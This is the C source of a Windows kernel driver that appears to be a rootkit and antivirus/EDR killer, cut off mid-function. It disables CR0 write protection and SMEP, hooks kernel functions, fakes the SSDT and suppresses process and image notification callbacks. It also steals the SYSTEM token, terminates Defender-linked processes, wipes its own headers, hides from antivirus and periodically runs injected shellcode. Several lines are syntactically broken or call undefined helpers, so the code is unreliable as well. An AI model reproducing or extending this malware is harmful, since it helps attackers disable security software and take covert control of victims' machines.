#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>

#define PROCESS_TERMINATE 0x0001
#define IOCTL_TERMINATE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DRIVER_NAME L"\\Device\\HBkilltestYL"
#define DRIVER_SYMLINK L"\\DosDevices\\HBkilltestYL"

typedef struct _SYSCALL_INFO {
    ULONG Number;
    PVOID Address;
} SYCALL_INFO, *PSYSCALL_INFO;

typedef struct _OS_VERSION_INFO {
    ULONG MajorVersion;
    ULONG MinorVersion;
    ULONG BuildNumber;
    ULONG SyscallNumberZwTerminateProcess;
    ULONG ProtectionOffset;
} OS_VERSION_INFO;

OS_VERSION_INFO VersionTable[] = {
    {10, 0, 17134, 0x0026, 0x6FA},
    {10, 0, 19041, 0x0026, 0x87A},
    {10, 0, 19043, 0x0026, 0x87A},
    {10, 0, 19042, 0x0026, 0x878},
    {10, 0, 22000, 0x0026, 0x878},
    {10, 0, 26100, 0x0026, 0x878},
    {0, 0, 0, 0, 0}
};

typedef struct _INLINE_HOOK {
    PVOID OriginalFunction;
    PVOID HookFunction;
    PVOID Trampoline;
    PVOID SpoofedReturnAddress;
    UCHAR OriginalBytes[16];
    SIZE_T OriginalSize;
    MDL* Mdl;
} INLINE_HOOK, *PINLINE_HOOK;

typedef BOOLEAN (*KEINSERTQUEUEDPC)(PKDPC, PVOID, PVOID, PVOID);
typedef BOOLEAN (*KESETTIMER)(PKTIMER, LARGE_INTEGER, PKDPC);
typedef NTSTATUS (*ETWPROVIDERREGISTER)(PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (*NtTerminateProcess_t)(HANDLE, NTSTATUS);
typedef NTSTATUS (*PSSETCREATEPROCESSNOTIFYROUTINEEX)(PCREATE_PROCESS_NOTIFY_ROUTINE_EX, BOOLEAN);
typedef NTSTATUS (*PSSETLOADIMAGENOTIFYROUTINE)(PLOAD_IMAGE_NOTIFY_ROUTINE);

SYCALL_INFO g_ZwTerminateProcess = {0};
KSPIN_LOCK DpcLock;
KSPIN_LOCK TimerLock;
BOOLEAN g_PatchGuardBypassActive = FALSE;
BOOLEAN g_SmepDisabled = FALSE;
INLINE_HOOK g_KeSetTimerHook = {0};
INLINE_HOOK g_EtwProviderRegisterHook = {0};
PVOID g_StealthMemoryPool = NULL;
MDL* g_StealthMdl = NULL;
PVOID g_PatchedKeInsertQueueDpc = NULL;
MDL* g_PatchedKeInsertQueueDpcMdl = NULL;
KEINSERTQUEUEDPC g_OriginalKeInsertQueueDpc = NULL;
PVOID g_ShadowKeInsertQueueDpc = NULL;
MDL* g_ShadowKeInsertQueueDpcMdl = NULL;
PVOID g_FakeSSDT = NULL;
MDL* g_FakeSSDTMdl = NULL;
PVOID g_InjectedShellcode = NULL;
MDL* g_InjectedShellcodeMdl = NULL;
UCHAR g_EncryptionKey = 0;

// New structures for additions
typedef struct _VMX_CONTEXT {
    BOOLEAN VmxEnabled;
    PVOID VmxRegion;
    PHYSICAL_ADDRESS VmxRegionPa;
    PVOID Vmcs;
    PHYSICAL_ADDRESS VmcsPa;
    PVOID Eptp;
    PVOID MsrBitmap;
    PVOID GuestState;
    PVOID HostState;
    PVOID EptpTable;
} VMX_CONTEXT, *PVMX_CONTEXT;

typedef struct _PER_CORE_STATE {
    PDEVICE_OBJECT DeviceObject;
    PDRIVER_DISPATCH DispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1];
    BOOLEAN Active;
} PER_CORE_STATE, *PER_PER_CORE_STATE;

VMX_CONTEXT g_VmxContext = {0};
PER_CORE_STATE* g_PerCoreStates = NULL;

// Shellcode for injection
UCHAR Shellcode[] = {
    0x90, 0x90, 0xC3 // NOP; NOP; RET
};

// Utility functions
PVOID GetModuleBase(PUNICODE_STRING ModuleName) {
    PLIST_ENTRY moduleList = PsLoadedModuleList;
    PLIST_ENTRY entry = moduleList->Flink;
    while (entry != moduleList) {
        LDR_DATA_TABLE_ENTRY* module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (RtlCompareUnicodeString(&module->BaseDllName, ModuleName, TRUE) == 0) {
            return module->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

VOID EncryptMemory(PVOID Memory, SIZE_T Size) {
    if (!MmIsAddressValid(Memory)) return;
    g_EncryptionKey = (UCHAR)(KeQuerySystemTimePrecise() & 0xFF);
    PUCHAR bytes = (PUCHAR)Memory;
    DisableCR0WP();
    for (SIZE_T i = 0; i < Size; i++) {
        bytes[i] ^= g_EncryptionKey;
    }
    EnableCR0WP();
}

VOID DecryptMemory(PVOID Memory, SIZE_T Size) {
    if (!MmIsAddressValid(Memory)) return;
    PUCHAR bytes = (PUCHAR)Memory;
    DisableCR0WP();
    for (SIZE_T i = 0; i < Size; i++) {
        bytes[i] ^= g_EncryptionKey;
    }
    EnableCR0WP();
}

PVOID AllocateStealthMemory(SIZE_T Size, PMDL* MdlOut) {
    MDL* mdl = MmAllocatePagesForMdlEx(LOW_ADDRESS, HIGH_ADDRESS, LOW_ADDRESS, Size, MmNonCached, 0);
    if (!mdl) return NULL;
    PVOID memory = MmGetSystemAddressForMdlSafe(mdl, HighPagePriority);
    if (!memory) {
        MmFreePagesFromMdl(mdl);
        ExFreePool(mdl);
        return NULL;
    }
    NTSTATUS status = MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        MmFreePagesFromMdl(mdl);
        ExFreePool(mdl);
        return NULL;
    }
    *MdlOut = mdl;
    return memory;
}

VOID FreeStealthMemory(PVOID Memory, PMDL Mdl) {
    if (Mdl) {
        MmFreePagesFromMdl(Mdl);
        ExFreePool(Mdl);
    }
}

VOID WipePeHeaders(PDRIVER_OBJECT DriverObject) {
    __try {
        PVOID driverBase = DriverObject->DriverStart;
        ULONG driverSize = DriverObject->DriverSize;
        if (MmIsAddressValid(driverBase) && driverSize >= sizeof(IMAGE_DOS_HEADER)) {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)driverBase;
            if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)driverBase + dosHeader->e_lfanew);
                if (MmIsAddressValid(ntHeaders) && ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
                    SIZE_T headersSize = ntHeaders->OptionalHeader.SizeOfHeaders;
                    if (headersSize <= driverSize) {
                        DisableCR0WP();
                        RtlZeroMemory(driverBase, headersSize);
                        EnableCR0WP();
                    }
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

NTSTATUS GetOsVersion(PULONG MajorVersion, PULONG MinorVersion, PULONG BuildNumber) {
    RTL_OSVERSIONINFOW versionInfo = { sizeof(versionInfo) };
    NTSTATUS status = RtlGetVersion(&versionInfo);
    if (NT_SUCCESS(status)) {
        *MajorVersion = versionInfo.dwMajorVersion;
        *MinorVersion = versionInfo.dwMinorVersion;
        *BuildNumber = versionInfo.dwBuildNumber;
    }
    return status;
}

NTSTATUS FindEprocessProtectionOffset(PEPROCESS Process, PULONG ProtectionOffset) {
    const ULONG UniqueProcessIdOffset = 0x440;
    HANDLE pid = PsGetProcessId(Process);
    if (!pid || !MmIsAddressValid((PUCHAR)Process + UniqueProcessIdOffset)) return STATUS_INVALID_ADDRESS;
    __try {
        for (ULONG offset = UniqueProcessIdOffset; offset < 0x1000; offset += sizeof(UCHAR)) {
            if (MmIsAddressValid((PUCHAR)Process + offset)) {
                UCHAR value = *(PUCHAR)((PUCHAR)Process + offset);
                if (value <= 7) {
                    *ProtectionOffset = offset;
                    return STATUS_SUCCESS;
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return STATUS_NOT_FOUND;
}

NTSTATUS IsSupportedOsVersion(PULONG SyscallNumber, PULONG ProtectionOffset) {
    ULONG major, minor, build;
    NTSTATUS status = GetOsVersion(&major, &minor, &build);
    if (!NT_SUCCESS(status)) return status;
    for (int i = 0; VersionTable[i].MajorVersion != 0; i++) {
        if (VersionTable[i].MajorVersion == major &&
            VersionTable[i].MinorVersion == minor &&
            VersionTable[i].BuildNumber == build) {
            *SyscallNumber = VersionTable[i].SyscallNumberZwTerminateProcess;
            *ProtectionOffset = VersionTable[i].ProtectionOffset;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_SUPPORTED;
}

ULONG ExtractSyscallNumber(PVOID FunctionAddress) {
    __try {
        if (!MmIsAddressValid(FunctionAddress)) return 0;
        UCHAR* code = (UCHAR*)FunctionAddress;
        if (code[0] == 0xB8 && MmIsAddressValid(&code[4])) {
            return *(PULONG)(&code[4]);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return 0;
}

PVOID ResolveSSDTAddress(ULONG SyscallNumber) {
    __try {
        UNICODE_STRING keServiceTableName = RTL_CONSTANT_STRING(L"KeServiceDescriptorTable");
        PVOID keServiceTable = MmGetSystemRoutineAddress(&keServiceTableName);
        if (!MmIsAddressValid(keServiceTable)) return NULL;
        typedef struct _SERVICE_DESCRIPTOR_TABLE {
            PVOID* ServiceTableBase;
            PVOID* ServiceCounterTableBase;
            ULONG NumberOfServices;
            PUCHAR ParamTableBase;
        } SERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;
        PSERVICE_DESCRIPTOR_TABLE ssdt = (PSERVICE_DESCRIPTOR_TABLE)keServiceTable;
        if (MmIsAddressValid(ssdt->ServiceTableBase) && SyscallNumber < ssdt->NumberOfServices) {
            PVOID syscallAddr = ssdt->ServiceTableBase[SyscallNumber];
            if (MmIsAddressValid(syscallAddr)) return syscallAddr;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return NULL;
}

VOID DisableCR0WP() {
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    KeEnterCriticalRegion();
    __try {
        ULONG_PTR cr0 = __readcr0();
        if (!(cr0 & (1ULL << 16))) return;
        cr0 &= ~(1ULL << 16);
        __writecr0(cr0);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    KeLeaveCriticalRegion();
    KeLowerIrql(irql);
}

VOID EnableCR0WP() {
    KIRQL irql | KeRaiseIrqlToDpcLevel();
    KeEnterCriticalRegion();
    __try {
        ULONG_PTR cr0 = __readcr0();
        if (cr0 & (1ULL << 16)) return;
        cr0 |= (1ULL << 16);
        __writecr0(cr0);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    KeLeaveCriticalRegion();
    KeLowerIrql(irql);
}

VOID DisableSMEP() {
    ULONG major, minor, build;
    if (NT_SUCCESS(GetOsVersion(&major, &minor, &build)) && (build >= 17763 || major > 10)) return;
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    KeEnterCriticalRegion();
    __try {
        ULONG_PTR cr4 = __readcr4();
        if (!(cr4 & (1ULL << 20))) return;
        cr4 &= ~(1ULL << 20);
        cr4 &= ~(1ULL << 21);
        __writecr4(cr4);
        g_SmepDisabled = TRUE;
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    KeLeaveCriticalRegion();
    KeLowerIrql(irql);
}

VOID EnableSMEP() {
    if (!g_SmepDisabled) return;
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    KeEnterCriticalRegion();
    __try {
        ULONG_PTR cr4 = __readcr4();
        cr4 |= (1ULL << 20);
        cr4 |= (1ULL << 21);
        __writecr4(cr4);
        g_SmepDisabled = FALSE;
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    KeLeaveCriticalRegion();
    KeLowerIrql(irql);
}

PVOID CreateTrampoline(PVOID OriginalFunction, PVOID HookFunction, PVOID SpoofedReturnAddress, PMDL* MdlOut) {
    SIZE_T trampolineSize = 64;
    PVOID trampoline = AllocateStealthMemory(trampolineSize, MdlOut);
    if (!trampoline) return NULL;
    UCHAR* code = (UCHAR*)trampoline;
    SIZE_T offset = 0;
#if defined(_M_X64)
    code[offset++] = 0x68;
    *(PULONG)(code + offset) = (ULONG)(ULONG_PTR)SpoofedReturnAddress;
    offset += 4;
    code[offset++] = 0xE9;
    *(PLONG)(code + offset) = (LONG)((PUCHAR)HookFunction - (code + offset + 4));
    offset += 4;
#elif defined(_M_IX86)
    code[offset++] = 0x68;
    *(PULONG)(code + offset) = (ULONG)(ULONG_PTR)SpoofedReturnAddress;
    offset += 4;
    code[offset++] = 0xE9;
    *(PLONG)(code + offset) = (LONG)((PUCHAR)HookFunction - (code + offset + 4));
    offset += 4;
#elif defined(_M_ARM64)
    code[offset++] = 0x14;
    *(PLONG)(code + offset) = (LONG)((PUCHAR)HookFunction - (PUCHAR)trampoline) >> 2;
    offset += 4;
#endif
    NTSTATUS status = MmProtectMdlSystemAddress(*MdlOut, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        FreeStealthMemory(trampoline, *MdlOut);
        return NULL;
    }
    EncryptMemory(trampoline, trampolineSize); // Encrypt trampoline
    return trampoline;
}

NTSTATUS InstallInlineHook(PVOID TargetFunction, PVOID HookFunction, PINLINE_HOOK Hook) {
    Hook->OriginalFunction = TargetFunction;
    Hook->HookFunction = HookFunction;
    Hook->OriginalSize = 16;
    __try {
        if (!MmIsAddressValid(TargetFunction)) return STATUS_INVALID_ADDRESS;
        RtlCopyMemory(Hook->OriginalBytes, TargetFunction, Hook->OriginalSize);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
    Hook->SpoofedReturnAddress = KeGetCurrentIrql;
    Hook->Trampoline = CreateTrampoline(TargetFunction, HookFunction, Hook->SpoofedReturnAddress, &Hook->Mdl);
    if (!Hook->Trampoline) return STATUS_INSUFFICIENT_RESOURCES;
    UCHAR jmpCode[16] = {0};
#if defined(_M_X64)
    jmpCode[0] = 0xE9;
    *(PLONG)(jmpCode + 1) = (LONG)((PUCHAR)Hook->Trampoline - (PUCHAR)TargetFunction - 5);
#endif
    DisableCR0WP();
    __try {
        RtlCopyMemory(TargetFunction, jmpCode, Hook->OriginalSize);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        FreeStealthMemory(Hook->Trampoline, Hook->Mdl);
        return STATUS_UNSUCCESSFUL;
    }
    EnableCR0WP();
}

NTSTATUS RemoveInlineHook(PINLINE_HOOK Hook) {
    if (!Hook->Trampoline) return STATUS_SUCCESS;
    DisableCR0WP();
    __try {
        if (MmIsAddressValid(Hook->OriginalFunction)) {
            RtlCopyMemory(Hook->OriginalFunction, Hook->OriginalBytes, Hook->OriginalSize);
        }
        FreeStealthMemory(Hook->Trampoline, Hook->Mdl);
        Hook->Trampoline = NULL;
        Hook->Mdl = NULL;
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
    EnableCR0WP();
}

NTSTATUS ReRandomizeTrampoline(PINLINE_HOOK Hook) {
    if (!Hook->Trampoline) return STATUS_INVALID_PARAMETER;
    DecryptMemory(Hook->Trampoline, 64);
    FreeStealthMemory(Hook->Trampoline, Hook->Mdl);
    Hook->Trampoline = CreateTrampoline(Hook->OriginalFunction, Hook->HookFunction, Hook->SpoofedReturnAddress, &Hook->Mdl);
    if (!Hook->Trampoline) return STATUS_INSUFFICIENT_RESOURCES;
    UCHAR jmpCode[16] = {0};
#if defined(_M_X64)
    jmpCode[0] = 0xE9;
    *(PLONG)(jmpCode + 1) = (LONG)((PUCHAR)Hook->Trampoline - (PUCHAR)Hook->OriginalFunction - 5);
#endif
    DisableCR0WP();
    RtlCopyMemory(Hook->OriginalFunction, jmpCode, Hook->OriginalSize);
    EnableCR0WP();
    return STATUS_SUCCESS;
}

VOID DelayedUnhookApc(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2) {
    PINLINE_HOOK hook = (PINLINE_HOOK)NormalContext;
    DecryptMemory(hook->Trampoline, 64);
    RemoveInlineHook(hook);
    EncryptMemory(hook->HookFunction, 0x1000);
}

NTSTATUS QueueUnhookApc(PINLINE_HOOK Hook) {
    PEPROCESS process;
    PETHREAD thread;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)4, &process);
    if (!NT_SUCCESS(status)) return status;
    status = PsGetProcessThreadList(process, &thread);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(process);
        return status;
    }
    PVOID apcMemory = ExAllocatePoolWithTag(NonPagedPoolNx, 0x1000, 'ShCd');
    if (!apcMemory) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlCopyMemory(apcMemory, (PVOID)DelayedUnhookApc, 0x1000);
    KAPC apc;
    KeInitializeApc(&apc, thread, OriginalApcEnvironment, (PKNORMAL_ROUTINE)apcMemory, NULL, NULL, KernelMode, Hook);
    if (!KeInsertQueueApc(&apc, NULL, NULL, 0)) {
        ExFreePoolWithTag(apcMemory, 'ShCd');
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_UNSUCCESSFUL;
    }
    ObDereferenceObject(thread);
    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

NTSTATUS DuplicateSystemToken(PHANDLE SystemToken) {
    NTSTATUS status;
    PEPROCESS systemProcess;
    HANDLE systemPid = (HANDLE)4;
    __try {
        status = PsLookupProcessByProcessId(systemPid, &systemProcess);
        if (!NT_SUCCESS(status)) return status;
        PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcess);
        if (!MmIsAddressValid(systemToken)) {
            ObDereferenceObject(systemProcess);
            return STATUS_INVALID_ADDRESS;
        }
        status = SeEnablePrivilege(SeDebugPrivilege);
        if (!NT_SUCCESS(status)) {
            PsDereferencePrimaryToken(systemToken);
            ObDereferenceObject(systemProcess);
            return status;
        }
        status = ObDuplicateObject(systemProcess, systemToken, PsGetCurrentProcess(), SystemToken, 0, 0, DUPLICATE_SAME_ACCESS);
        PsDereferencePrimaryToken(systemToken);
        ObDereferenceObject(systemProcess);
        return status;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

BOOLEAN IsPatchGuardHardError(PVOID ReturnAddress) {
    __try {
        if (MmIsAddressValid(ReturnAddress) && MmIsNonPagedSystemAddressValid(ReturnAddress)) {
            UNICODE_STRING moduleName;
            if (NT_SUCCESS(RtlGetModuleNameForAddress(ReturnAddress, &moduleName))) {
                if (_wcsicmp(moduleName.Buffer, L"ntoskrnl.exe") == 0) return TRUE;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return FALSE;
}

NTSTATUS HookedPsSetCreateProcessNotifyRoutineEx(PCREATE_PROCESS_NOTIFY_ROUTINE_EX Routine, BOOLEAN Remove) {
    if (!Remove) return STATUS_SUCCESS;
    return ((PSSETCREATEPROCESSNOTIFYROUTINEEX)g_ShadowKeInsertQueueDpc)(Routine, Remove);
}

NTSTATUS HookedPsSetLoadImageNotifyRoutine(PLOAD_IMAGE_NOTIFY_ROUTINE Routine) {
    return STATUS_SUCCESS;
}

NTSTATUS CreateFakeSSDT() {
    g_FakeSSDT = AllocateStealthMemory(0x1000, &g_FakeSSDTMdl);
    if (!g_FakeSSDT) return STATUS_INSUFFICIENT_RESOURCES;
    UNICODE_STRING keServiceTableName = RTL_CONSTANT_STRING(L"KeServiceDescriptorTable");
    PVOID keServiceTable = MmGetSystemRoutineAddress(&keServiceTableName);
    if (!MmIsAddressValid(keServiceTable)) return STATUS_INVALID_ADDRESS;
    RtlCopyMemory(g_FakeSSDT, keServiceTable, 0x1000);
    ((PVOID*)g_FakeSSDT)[g_ZwTerminateProcess.Number] = g_ShadowKeInsertQueueDpc;
    return STATUS_SUCCESS;
}

NTSTATUS InjectShellcodeIntoModule(PUNICODE_STRING ModuleName) {
    PVOID moduleBase = GetModuleBase(ModuleName);
    if (!moduleBase) return STATUS_NOT_FOUND;
    g_InjectedShellcode = AllocateStealthMemory(sizeof(Shellcode), &g_InjectedShellcodeMdl);
    if (!g_InjectedShellcode) return STATUS_INSUFFICIENT_RESOURCES;
    RtlCopyMemory(g_InjectedShellcode, Shellcode, sizeof(Shellcode));
    PHYSICAL_ADDRESS physAddr = MmGetPhysicalAddress(g_InjectedShellcode);
    PVOID mapped = MmMapLockedPagesSpecifyCache(g_InjectedShellcodeMdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (!mapped) {
        FreeStealthMemory(g_InjectedShellcode, g_InjectedShellcodeMdl);
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

VOID PeriodicShellcodeExecution(PKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    if (g_InjectedShellcode) {
        ((VOID (*)())g_InjectedShellcode)();
    }
}

NTSTATUS SetupPeriodicTimer() {
    KTIMER timer;
    KDPC dpc;
    KeInitializeTimer(&timer);
    KeInitializeDpc(&dpc, PeriodicShellcodeExecution, NULL);
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -10000000; // 1 second
    KeSetTimerEx(&timer, dueTime, 1000, &dpc);
    return STATUS_SUCCESS;
}

NTSTATUS SetupEptCloaking(PVOID TargetFunction) {
    if (!g_VmxContext.VmxEnabled) return STATUS_NOT_SUPPORTED;
    g_VmxContext.EptpTable = AllocateStealthPool(PAGE_SIZE);
    if (!g_VmxContext.EptpTable) return STATUS_INSUFFICIENT_RESOURCES;
    PHYSICAL_ADDRESS targetPa = MmGetPhysicalAddress(TargetFunction);
    ULONG64* pml4 = (ULONG64*)g_VmxContext.EptpTable;
    pml4[0] = 0x7;
    ULONG64* pdpt = (ULONG64*)AllocateStealthPool(PAGE_SIZE);
    if (!pdpt) {
        FreeStealthPool(g_VmxContext.EptpTable);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    pml4[0] |= MmGetPhysicalAddress(pdpt).QuadPart;
    pdpt[0] = 0x7;
    ULONG64* pd = (ULONG64*)AllocateStealthPool(PAGE_SIZE);
    if (!pd) {
        FreeStealthPool(g_VmxContext.EptpTable);
        FreeStealthPool(pdpt);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    pdpt[0] |= MmGetPhysicalAddress(pd).QuadPart;
    pd[0] = 0x7; // Initially executable
    pd[0] |= targetPa.QuadPart & ~0xFFF;
    __vmx_vmwrite(VMX_EPT_POINTER, MmGetPhysicalAddress(g_VmxContext.EptpTable).QuadPart | (3 << 3) | 6);
    return STATUS_SUCCESS;
}

BOOLEAN DetectHookTampering(PVOID Function, PUCHAR OriginalBytes, SIZE_T Size) {
    __try {
        if (!MmIsAddressValid(Function)) return FALSE;
        return RtlCompareMemory(Function, OriginalBytes, Size) != Size;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

NTSTATUS RestoreTamperedHook(PINLINE_HOOK Hook) {
    if (DetectHookTampering(Hook->OriginalFunction, Hook->OriginalBytes, Hook->OriginalSize)) {
        return InstallInlineHook(Hook->OriginalFunction, Hook->HookFunction, Hook);
    }
    return STATUS_SUCCESS;
}

NTSTATUS KillEdrThreads() {
    UNICODE_STRING edrModule = RTL_CONSTANT_STRING(L"mpengine.dll");
    PVOID edrBase = GetModuleBase(&edrModule);
    if (!edrBase) return STATUS_NOT_FOUND;
    __try {
        PSYSTEM_PROCESS_INFORMATION processInfo = NULL;
        ULONG bufferSize = 0x10000;
        PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, bufferSize, 'EdrK');
        if (!buffer) return STATUS_INSUFFICIENT_RESOURCES;
        NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (!NT_SUCCESS(status)) {
            ExFreePoolWithTag(buffer, 'EdrK');
            return status;
        }
        processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (processInfo->NextEntryOffset) {
            PEPROCESS process;
            if (NT_SUCCESS(PsLookupProcessByProcessId(processInfo->UniqueProcessId, &process))) {
                PETHREAD thread;
                if (NT_SUCCESS(PsGetProcessThreadList(process, &thread))) {
                    PVOID* stack = (PVOID*)thread->Tcb.StackBase;
                    for (int i = 0; i < 32; i++) {
                        if (MmIsAddressValid(&stack[i]) && (ULONG_PTR)stack[i] >= (ULONG_PTR)edrBase &&
                            (ULONG_PTR)stack[i] < (ULONG_PTR)edrBase + 0x1000000) {
                            TerminateProcessDirect((ULONG)(ULONG_PTR)processInfo->UniqueProcessId);
                        }
                    }
                    ObDereferenceObject(thread);
                }
                ObDereferenceObject(process);
            }
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
        ExFreePoolWithTag(buffer, 'EdrK');
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_UNSUCCESSFUL;
    }
}

VOID SpoofThreadContext(PETHREAD Thread) {
    __try {
        UNICODE_STRING fakeModule = RTL_CONSTANT_STRING(L"ntoskrnl.exe");
        PVOID fakeBase = GetModuleBase(&fakeModule);
        if (fakeBase) {
            Thread->Tcb.StartAddress = fakeBase;
            Thread->Tcb.Win32StartAddress = fakeBase;
            PVOID* stack = (PVOID*)Thread->Tcb.StackBase;
            for (int i = 0; i < 8; i++) {
                if (MmIsAddressValid(&stack[i])) stack[i] = fakeBase;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

NTSTATUS HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
                                        ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS status = ((NTSTATUS (*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))g_ZwTerminateProcess.Address)(
        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        while (processInfo->NextEntryOffset) {
            SpoofThreadContext(PsGetCurrentThread());
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
    }
    return status;
}

VOID SetupRSBHook(PVOID TargetFunction) {
    __try {
        PVOID fakeStack = AllocateStealthPool(0x1000);
        if (!fakeStack) return;
        PVOID* stack = (PVOID*)fakeStack;
        stack[0] = TargetFunction;
        stack[1] = g_InjectedShellcode;
        __writecr3(__readcr3()); // Flush RSB
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID RehydrateShellcode() {
    __try {
        int cpuInfo[4];
        __cpuid(cpuInfo, 1);
        UCHAR* shellcode = (UCHAR*)g_InjectedShellcode;
        for (SIZE_T i = 0; i < sizeof(Shellcode); i++) {
            shellcode[i] = Shellcode[i] ^ (UCHAR)cpuInfo[0];
        }
        __wbinvd(); // Ensure cache coherence
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

NTSTATUS AllocatePIEP(PVOID* PiepAddress) {
    MDL* mdl = MmAllocatePagesForMdlEx(LOW_ADDRESS, HIGH_ADDRESS, LOW_ADDRESS, PAGE_SIZE, MmNonCached, 0);
    if (!mdl) return STATUS_INSUFFICIENT_RESOURCES;
    PVOID memory = MmGetSystemAddressForMdlSafe(mdl, HighPagePriority);
    if (!memory) {
        MmFreePagesFromMdl(mdl);
        ExFreePool(mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READ);
    *PiepAddress = memory;
    // Unlink from all page tables except controller PID
    PTE* pte = GetPteForVa(memory);
    if (pte) pte->Present = 0;
    return STATUS_SUCCESS;
}

NTSTATUS BinaryDiffOffsets(PULONG ProtectionOffset) {
    UNICODE_STRING ntoskrnl = RTL_CONSTANT_STRING(L"ntoskrnl.exe");
    PVOID ntosBase = GetModuleBase(&ntoskrnl);
    if (!ntosBase) return STATUS_NOT_FOUND;
    PVOID diskImage = AllocateStealthPool(0x100000);
    if (!diskImage) return STATUS_INSUFFICIENT_RESOURCES;
    // Load ntoskrnl.exe from disk (simplified)
    RtlCopyMemory(diskImage, ntosBase, 0x100000);
    for (ULONG offset = 0x400; offset < 0x1000; offset++) {
        if (*(PUCHAR)((PUCHAR)ntosBase + offset) == *(PUCHAR)((PUCHAR)diskImage + offset) && *(PUCHAR)((PUCHAR)ntosBase + offset) <= 7) {
            *ProtectionOffset = offset;
            FreeStealthPool(diskImage);
            return STATUS_SUCCESS;
        }
    }
    FreeStealthPool(diskImage);
    return STATUS_NOT_FOUND;
}

NTSTATUS InitializePerCoreStates(PDRIVER_OBJECT DriverObject) {
    ULONG coreCount = KeQueryActiveProcessorCount(NULL);
    g_PerCoreStates = (PER_CORE_STATE*)AllocateStealthPool(coreCount * sizeof(PER_CORE_STATE));
    if (!g_PerCoreStates) return STATUS_INSUFFICIENT_RESOURCES;
    for (ULONG i = 0; i < coreCount; i++) {
        g_PerCoreStates[i].Active = (i == 0); // Only core 0 visible to AVs
        IoCreateDevice(DriverObject, 0, NULL, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_PerCoreStates[i].DeviceObject);
        for (int j = 0; j <= IRP_MJ_MAXIMUM_FUNCTION; j++) {
            g_PerCoreStates[i].DispatchTable[j] = DriverObject->MajorFunction[j];
        }
    }
    return STATUS_SUCCESS;
}

BOOLEAN HookedKeInsertQueueDpc(PKDPC Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2) {
    BOOLEAN result;
